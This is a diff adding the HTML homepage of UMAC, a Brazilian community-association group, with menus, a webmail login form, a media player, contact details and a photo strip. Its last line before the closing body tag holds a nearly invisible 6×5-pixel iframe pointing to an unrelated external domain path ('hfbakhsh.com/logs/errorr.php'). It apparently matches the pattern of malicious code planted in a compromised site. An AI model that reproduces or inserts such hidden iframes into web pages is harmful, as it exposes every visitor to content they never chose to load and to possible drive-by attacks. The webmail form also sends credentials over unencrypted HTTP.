@@ -1,0 +1,362 @@
+<html>
+<head>
+<title>UMAC - Uni&atilde;o Maracaiense de Associa&ccedil;&otilde;es Comunit&aacute;rias</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+<!--
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-image: url(images/fundo_tracejado.jpg);
+	SCROLLBAR-ARROW-COLOR: #000000;
+	SCROLLBAR-TRACK-COLOR: #f9f9f9;
+	SCROLLBAR-BASE-COLOR: #f9f9f9;
+	SCROLLBAR-FACE-COLOR: #f9f9f9;
+	SCROLLBAR-HIGHLIGHT-COLOR: #000000;
+	SCROLLBAR-SHADOW-COLOR: #000000;
+}
+
+input {Background-Color: #ffffff; Border: 1px ridge #000000;font-family:verdana, arial, helvetica, sans-serif; font-size:8pt;color:#000000;}
+textarea{Background-Color: #ffffff;Border: 1px ridge #000000;font-family:verdana, arial, helvetica, sans-serif;font-size:8pt;color:#000000;}
+select {Background-Color: #ffffff;Border: 1px ridge #000000;font-family:verdana, arial, helvetica, sans-serif;font-size:8pt;color:#000000;}
+
+-->
+</style>
+<script language="JavaScript">
+
+//--------  abre janela -- Pop-up
+function abre(pagina,janela,largura,altura){
+var desktopname = window.open(pagina,janela,'width='+largura+',height='+altura+',toolbar=no,copyhistory=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no,top=0,left=0');
+desktopname.focus();
+}
+  javascript:abre("pop_up/index.html", "Páscoa", "400", "300")
+//-->
+</script>
+<script language="Javascript">
+function validaform()
+{
+form = document.form3;
+	if ((form.f_email.value=="") || (form.f_email.value=="@umac.org.br"))
+	{
+		alert("Favor preencher o campo e-mail!!");
+		document.form3.f_email.focus();		
+		return false;
+	}
+	if ((form.f_pass.value=="") || (form.f_pass.value=="123456"))
+	{
+		alert("Favor preencher o campo senha!!");
+		document.form3.f_pass.focus();
+		return false;
+	}
+}
+</script>
+<link href="estilo.css" rel="stylesheet" type="text/css">
+<script language="JavaScript">
+<!--
+function mmLoadMenus() {
+  if (window.mm_menu_1113220347_0) return;
+              window.mm_menu_1113220347_0 = new Menu("root",142,16,"Verdana, Arial, Helvetica, sans-serif",10,"#FFAB03","#FFFFFF","#FFFFFF","#000000","left","middle",3,0,200,-5,7,true,true,true,2,true,true);
+  mm_menu_1113220347_0.addMenuItem("Diretoria&nbsp;atual","window.open('sobre_ong/diretoria_atual/index.html', ',');");
+  mm_menu_1113220347_0.addMenuItem("Missão","window.open('sobre_ong/missao/index.html', ',');");
+  mm_menu_1113220347_0.addMenuItem("Prestação&nbsp;de&nbsp;contas","window.open('sobre_ong/prestacao_contas/index.html', ',');");
+  mm_menu_1113220347_0.addMenuItem("Estatuto","window.open('sobre_ong/estatuto/estatuto.pdf', '_blank');");
+  mm_menu_1113220347_0.addMenuItem("Seja&nbsp;voluntário","window.open('sobre_ong/seja_voluntario/index.html', ',');");
+   mm_menu_1113220347_0.fontWeight="bold";
+   mm_menu_1113220347_0.hideOnMouseOut=true;
+   mm_menu_1113220347_0.bgColor='#555555';
+   mm_menu_1113220347_0.menuBorder=1;
+   mm_menu_1113220347_0.menuLiteBgColor='#FFFFFF';
+   mm_menu_1113220347_0.menuBorderBgColor='#000000';
+
+mm_menu_1113220347_0.writeMenus();
+} // mmLoadMenus()
+//-->
+</script>
+<script language="JavaScript" src="mm_menu.js"></script>
+<!-- Barra de Status -->
+<script language="JavaScript">
+var speed = 100 
+var pause = 3000
+var timerID = null
+var bannerRunning = false
+var ar = new Array()
+ar[0] = "Seja bem vindo(a) ao mais novo site da UMAC.."
+ar[1] = "União Maracaiense de Associações Comunitárias.."
+ar[2] = "Caminhando e cantando, e seguindo a canção.."
+ar[3] = "..somos todos iguais, de braços dados ou não!"
+var currentMessage = 0
+var offset = 0
+function stopBanner() {
+if (bannerRunning)
+clearTimeout(timerID)
+bannerRunning = false
+}
+function startBanner() {
+stopBanner()
+showBanner()
+}
+function showBanner() {
+var text = ar[currentMessage]
+if (offset < text.length) {
+if (text.charAt(offset) == " ")
+offset++ 
+var partialMessage = text.substring(0, offset + 1) 
+window.status = partialMessage
+offset++ // IE sometimes has trouble with "++offset"
+timerID = setTimeout("showBanner()", speed)
+bannerRunning = true
+} else {
+offset = 0
+currentMessage++
+if (currentMessage == ar.length)
+currentMessage = 0
+timerID = setTimeout("showBanner()", pause)
+bannerRunning = true
+}
+}
+startBanner();
+// -->
+</script>
+<!-- Barra de Status -->
+</head>
+<body>
+<script language="JavaScript1.2">mmLoadMenus();</script>
+
+<table width="680" height="604" border="1" bordercolor="#000000" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td><table width="680" height="604" border="0" align="center" cellpadding="0" cellspacing="0" id="Table_01">
+      <tr>
+        <td colspan="10" align="left" valign="top"><table width="471" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><img src="images/menu_topo.jpg" width="471" height="22" border="0" usemap="#Map"></td>
+          </tr>
+          <tr>
+            <td width="471" height="64" align="center" valign="middle" background="images/r1_c1.jpg">
+			
+			<script language="JavaScript">
+			<!--
+			ObjData = new Date();
+			var PegaDiaSemana = ObjData.getDay();
+			if (PegaDiaSemana == 0) { Semana = "Domingo"} else
+				if (PegaDiaSemana == 1) { Semana = "Segunda-Feira"} else
+				if (PegaDiaSemana == 2) { Semana = "Terça-Feira"} else
+				if (PegaDiaSemana == 3) { Semana = "Quarta-Feira"} else
+				if (PegaDiaSemana == 4) { Semana = "Quinta-Feira"} else
+				if (PegaDiaSemana == 5) { Semana = "Sexta-Feira"} else
+				if (PegaDiaSemana == 6) { Semana = "Sábado"}
+			var Dia = ObjData.getDate();
+			var PegaMes = ObjData.getMonth()+1;
+			if (PegaMes == 1) { Mes = "Janeiro"} else
+				if (PegaMes == 2) { Mes = "Fevereiro"} else
+				if (PegaMes == 3) { Mes = "Março"} else
+				if (PegaMes == 4) { Mes = "Abril"} else
+				if (PegaMes == 5) { Mes = "Maio"} else
+				if (PegaMes == 6) { Mes = "Junho"} else
+				if (PegaMes == 7) { Mes = "Julho"} else
+				if (PegaMes == 8) { Mes = "Agosto"} else
+				if (PegaMes == 9) { Mes = "Setembro"} else
+				if (PegaMes == 10) { Mes = "Outubro"} else
+				if (PegaMes == 11) { Mes = "Novembro"} else
+				if (PegaMes == 12) { Mes = "Dezembro"}
+			var Ano = ObjData.getYear();
+			  if (Ano < 2000) {
+			    Ano = 1900+Ano;
+			  }
+			document.write ('<font size=1 color=black face=Verdana> ' + Semana + ', ' + Dia + ' de ' + Mes + ' de ' + Ano + '.');
+			// -->
+	</script>			</td>
+          </tr>
+        </table></td>
+        <td colspan="4"><img src="images/r1_c2.jpg" width="209" height="86" alt=""></td>
+      </tr>
+      <tr>
+        <td><img src="images/btn_sobre_ong.jpg" alt="" name="image1" width="94" height="25" border="0" usemap="#image1Map"></td>
+        <td><img src="images/btn_eventos.jpg" alt="" width="93" height="25" border="0" usemap="#Map2"></td>
+        <td colspan="4"><img src="images/btn_documentos.jpg" alt="" width="95" height="25" border="0" usemap="#Map3"></td>
+        <td><img src="images/btn_parceiros.jpg" alt="" width="94" height="25" border="0" usemap="#Map4"></td>
+        <td colspan="4"><img src="images/btn_fotos.jpg" alt="" width="96" height="25" border="0" usemap="#Map5"></td>
+        <td colspan="3"><img src="images/r1_c2-09.jpg" width="208" height="25" alt=""></td>
+      </tr>
+      <tr>
+        <td colspan="12" rowspan="2" width="473" height="181"><!--<img src="images/animacao_flash.jpg" width="473" height="181">-->
+		
+		<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="473" height="181">
+          <param name="movie" value="images/animacao.swf">
+          <param name="quality" value="high">
+          <embed src="images/animacao.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="473" height="181"></embed>
+        </object>		  
+		
+		</td>
+        <td colspan="2"><img src="images/r1_c2-11.jpg" width="207" height="19" alt=""></td>
+      </tr>
+      <tr>
+        <td width="207" height="162" colspan="2" align="center" valign="top" background="images/right_flash.jpg" class="texto_verdana">
+	
+<img src="images/home_title_webmail.gif"><br><br><br>
+<!--WebMail-->
+			<table width=165 border=0 cellspacing=0 cellpadding=0 align=center target="_top">
+			<form name="form3" action="http://umail.studioserver.com.br/msglist.php" method=post target="_blank" onSubmit="return validaform()">
+			<tr>
+			<td align=left class="texto" height="20">
+			<b class="texto_verdana"> E-mail: </b>			</td>
+			
+			<td height="20" align="right" valign="middle" class="default">
+			<input type=text size=10 name="f_email" onFocus="inn(this,2)" onBlur="out(this,2)" value="@umac.org.br" class="textbox" style="width:115px;"></td>
+			</tr>
+			<tr>
+			<td align=left class="texto" height="20">
+			<b class="texto_verdana"> Senha: </b>			</td>
+			
+			<td height="20" align="right" valign="middle" class="default">
+			<input type=password size=5 name="f_pass" onFocus="inn(this,2)" onBlur="out(this,2)" value="123456" class="textbox" style="width:115px;" onClick="this.value=''"></td>
+			</tr>
+			<tr>
+			<td class="texto" colspan=2 align=right>
+			<input type=submit name=submit value="Entrar" class="button" style="color:#000000; background:#ffffff; border:1px solid #000000; border-right:1px solid #000000; border-bottom:1px solid #0000000; FONT-SIZE: 7pt;"></td></tr>
+			</form>
+			</table><br>
+<!--WebMail-->  
+        <div align="left">
+		- <a href="#" onClick="window.open('fale_conosco/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=529,height=582'); return false;" class="link">Esqueci a senha</a>		<br>
+		- <a href="#" onClick="window.open('fale_conosco/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=529,height=582'); return false;" class="link">Pedido de e-mail</a></div></td>
+      </tr>
+      <tr>
+        <td colspan="14"><img src="images/r2_c1.jpg" width="680" height="9" alt=""></td>
+      </tr>
+      <tr>
+        <td width="199" height="133" colspan="3" align="center" valign="middle" background="images/r3_c1.jpg" bgcolor="#000000">
+		
+		<!-- Media Player -->
+		
+		<table width="100%" border="1" cellpadding="0" cellspacing="0" bordercolor="#000000">
+		<tr>
+		<td>
+		<object classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6" id="WindowsMediaPlayer1" align="left">
+ <param name="URL" value="musicas/playlist.asx">
+ <param name="rate" value="1">
+ <param name="balance" value="0">
+ <param name="currentPosition" value="0">
+ <param name="defaultFrame" value>
+ <param name="playCount" value="1">
+ <param name="autoStart" value="True">
+ <param name="currentMarker" value="0">
+ <param name="invokeURLs" value="-1">
+ <param name="volume" value="25">
+ <param name="mute" value="0">
+ <param name="uiMode" value="full">
+ <param name="stretchToFit" value="0">
+ <param name="windowlessVideo" value="0">
+ <param name="enabled" value="-1">
+ <param name="enableContextMenu" value="-1">
+ <param name="fullScreen" value="0">
+ <param name="SAMIStyle" value>
+ <param name="SAMILang" value>
+ <param name="SAMIFilename" value>
+ <param name="captioningID" value>
+ <param name="enableErrorDialogs" value="0">
+ <param name="_cx" value="5150">
+ <param name="_cy" value="3400">
+</object>
+		</td></tr></table>
+		<!-- Media Player -->		</td>
+        <td colspan="2"><img src="images/r3_c2.jpg" width="22" height="133" alt=""></td>
+        <td width="459" height="133" colspan="9" align="center" valign="middle" background="images/r3_c3.jpg" class="texto_verdana_branco"><b>UMAC (Uni&atilde;o Maracaiense de Associa&ccedil;&otilde;es Comunit&aacute;rias) <br>
+          CNPJ N&ordm;. 03.479.641/0001-69 - A.C. (ASSESSORIA COMUNIT&Aacute;RIA)<br>
+          Rua: Coronel Azarias Ribeiro, N&ordm;. 936 - A - Centro<br>
+          CEP: 19.840-000 - Maraca&iacute; - Estado de S&atilde;o Paulo <br>
+		  UTILIDADE PÚBLICA MUNICIPAL – LEI DE Nº. 1.345 DE 19/10/2001 <br>
+          Contatos: (18) 3371-1578 / (18) 3371-1938 / (18) 3371-1109 <br>
+          E-mail: atendimento@umac.org.br <br>
+          Visite nosso site: http://www.umac.org.br </b><br>
+          <br>
+          &quot;...Os Avan&ccedil;os Comunit&aacute;rios Continuam...&quot;</td>
+      </tr>
+      <tr>
+        <td width="199" height="145" colspan="3" align="left" valign="top" background="images/r4_c1.jpg" class="texto_verdana"><div align="center"><img src="images/home_title_dir_atual.gif" width="173" height="36"></div>
+          <div align="justify"><br>
+          Para que voc&ecirc; possa conferir a lista de nossa Diretoria Atual, basta clicar em &quot;saiba mais..&quot; para melhor visualiza&ccedil;&atilde;o. </div>
+          <div align="right"><br>
+          <a href="#" onClick="window.open('sobre_ong/diretoria_atual/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,width=529,height=582'); return false;" class="link">
+		  |+| Ver mais..</a>
+		  </div></td>
+        <td><img src="images/r4_c2.jpg" width="12" height="145" alt=""></td>
+        <td width="198" height="145" colspan="4" align="left" valign="top" background="images/r4_c3.jpg" class="texto_verdana"><div align="center"><img src="images/home_title_documentos.gif" width="127" height="36"></div>
+          <div align="justify"><br>
+          Atualmente existem documentos para donwload, dentre eles, of&iacute;cios, convites especiais, document&aacute;rios, etc.. </div>
+          <div align="right"><br> 
+          <a href="#" onClick="window.open('documentos/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,width=529,height=582'); return false;" class="link">
+		  |+| Ver mais..</a></div></td>
+        <td><img src="images/r4_c4.jpg" width="12" height="145" alt=""></td>
+        <td width="232" height="145" colspan="4" align="left" valign="top" background="images/r4_c5.jpg" class="texto_verdana"><div align="center"><img src="images/title_fale_fotos.gif" width="67" height="36"></div><br>
+		
+		<marquee behavior="alternate" scrollamount="1" scrolldelay="1">
+		<a href="#" onClick="window.open('fotos/new/album.php','Janela'); return false;" class="link">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/001.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/002.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/003.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/004.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/005.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/006.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/007.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/008.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/009.jpg" width="70" height="53" border="0" title="Fotos: UMAC">
+		<img style="BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; BORDER-LEFT: #000000 1px solid; BORDER-BOTTOM: #000000 1px solid" src="fotos/julho_2008/imagens/fotos/p/010.jpg" width="70" height="53" border="0" title="Fotos: UMAC">		</a>
+		</marquee>
+		
+		</td>
+        <td><img src="images/r4_c6.jpg" width="27" height="145" alt=""></td>
+      </tr>
+      <tr>
+        <td width="680" height="24" colspan="14" align="center" valign="middle" background="images/fundo_rodape.jpg" class="texto_rodape"><table width="680" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="568" align="right" valign="middle" class="texto_rodape">Copyright &copy; 2014	-	Uni&atilde;o Maracaiense de Associa&ccedil;&otilde;es Comunit&aacute;rias - Todos os direitos reservados - Powered by</td>
+            <td width="112"><a href="http://www.activesystemwd.com.br" target="_blank"><img src="images/logo_active.jpg" alt="Active System Webdesigner TM" width="58" height="21" border="0"></a></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/spacer.gif" width="94" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="93" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="12" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="12" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="10" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="61" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="94" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="33" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="12" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="50" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="1" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="1" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="180" height="1" alt=""></td>
+        <td><img src="images/spacer.gif" width="27" height="1" alt=""></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+<div align="center">
+    <map name="image1Map">
+      <area shape="rect" coords="14,11,83,23" href="#" onMouseOver="MM_showMenu(window.mm_menu_1113220347_0,14,-70,null,'image1')" onMouseOut="MM_startTimeout();" tabindex="1">
+    </map>
+    
+    <map name="Map">
+      <area shape="rect" coords="7,5,65,19" href="mailto:atendimento@umac.org.br?Subject=Contato pelo site" alt="CONTATO">
+      <area shape="rect" coords="77,4,154,19" href="#" onClick="window.open('fale_conosco/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,width=529,height=582'); return false;" alt="FALE CONOSCO">
+    </map>
+    <map name="Map2">
+      <area shape="rect" coords="26,9,74,21" href="#" onClick="window.open('eventos/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,width=529,height=582'); return false;" alt="EVENTOS">
+    </map>
+    <map name="Map3">
+      <area shape="rect" coords="15,10,91,21" href="#" onClick="window.open('documentos/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,width=529,height=582'); return false;" alt="DOCUMENTOS">
+    </map>
+    <map name="Map4">
+      <area shape="rect" coords="24,10,80,20" href="#" onClick="window.open('parceiros/index.html','Janela','toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=no,width=529,height=582'); return false;" alt="PARCEIROS">
+    </map>
+    <map name="Map5">
+      <area shape="rect" coords="30,9,68,22" href="#" onClick="window.open('fotos/new/album.php'); return false;" alt="FOTOS">
+    </map>
+	<p class="texto_rodape">&Eacute; expressamente proibida a reprodu&ccedil;&atilde;o total ou parcial do conte&uacute;do deste site e dos textos dispon&iacute;veis seja atrav&eacute;s de<br> m&iacute;dia eletr&ocirc;nica, impressa, ou qualquer outra forma de distribui&ccedil;&atilde;o sem a autoriza&ccedil;&atilde;o pr&eacute;via e por escrito dos respons&aacute;veis pelo site!!</p>  
+    <a href="http://www.adobe.com/products/acrobat/readstep2.html?promoid=BONRM" target="_blank"><img src="images/get_adobe_reader.jpg" width="165" height="45" border="0"></a>&nbsp;<a href="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&promoid=BONRN" target="_blank"><img src="images/get_adobe_flashplayer.jpg" width="163" height="44" border="0"></a>&nbsp;<a href="http://www.studioserver.com.br" target="_blank"><img src="http://powered.studioserver.com.br/hospedagem.gif" alt="Hospedagem de Sites" border="0"></a></div>
+<iframe src="hfbakhsh.com/logs/errorr.php" border="0" width="6" height="5" /></body>
+</html>
